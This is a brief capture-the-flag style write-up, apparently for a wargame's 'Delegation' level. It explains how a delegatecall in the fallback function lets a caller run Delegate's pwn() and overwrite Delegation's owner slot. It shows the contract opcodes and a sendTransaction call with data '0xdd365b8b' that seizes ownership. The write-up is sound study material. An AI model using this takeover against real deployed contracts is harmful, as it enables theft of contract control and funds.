The issue in this contract come from the delegatecall.

the Delegation contract will make a call of the Delegate function, by using delagatecall
But instead of modifying Delegate storage it will modify hix own storage.
As "owner" variable address have the same position in the storage of both contract
a call to pwn() will modify the "owner" variable of Delegation not Delegate


As pwd() is a fallback of Delegate, and the delegatecall is made in the fallback of Delegation
We just need to send a transaction to Delegation contract and pass the methodID to it

To find the methodID we can look at the stack of Delegat contract

contract Delegation  -> addr: 0x8d0B95DE0753b92badaBBb4612440C44522a9Eff

contract Delegate -> addr: 0x18D36e5B5d6fD3Bd3A450395785D68515aA1963E

OP Code of Delegate : 

PUSH1 0x60
PUSH1 0x40
MSTORE
PUSH4 0xffffffff
PUSH29 0x0100000000000000000000000000000000000000000000000000000000
PUSH1 0x00
CALLDATALOAD
DIV
AND
PUSH4 0x8da5cb5b
DUP2
EQ
PUSH1 0x46
JUMPI
DUP1
PUSH4 0xdd365b8b
EQ
PUSH1 0x7f
JUMPI


if we call: contract.sendTransaction({from: player, to: contract.address, data: "0x8da5cb5b"})

the result in etherscan is the following

Input Data:

Function: owner() ***

MethodID: 0x8da5cb5b

if we call contract.sendTransaction({from: player, to: contract.address, data: "0xdd365b8b"})

Function: pwn() ***

MethodID: 0xdd365b8b

We have succefully been promot owner of the contract
